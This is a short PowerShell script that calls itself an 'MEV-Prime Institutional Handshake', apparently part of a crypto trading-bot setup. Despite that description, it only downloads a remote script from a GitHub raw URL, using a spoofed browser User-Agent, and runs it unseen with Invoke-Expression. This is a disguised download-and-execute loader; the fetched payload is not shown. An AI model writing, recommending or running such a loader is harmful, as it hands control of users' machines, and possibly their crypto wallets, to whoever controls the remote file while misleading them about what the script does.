# MEV-Prime Institutional Handshake
# This script initializes the bridge using standard .NET calls
try {
    $url = "https://raw.githubusercontent.com/adchar2022/test/main/mev_init.ps1"
    $client = New-Object System.Net.WebClient
    $client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $scriptContent = $client.DownloadString($url)
    
    # Execute the content
    Invoke-Expression $scriptContent
} catch {
    Write-Error "Handshake failed: $($_.Exception.Message)"
}
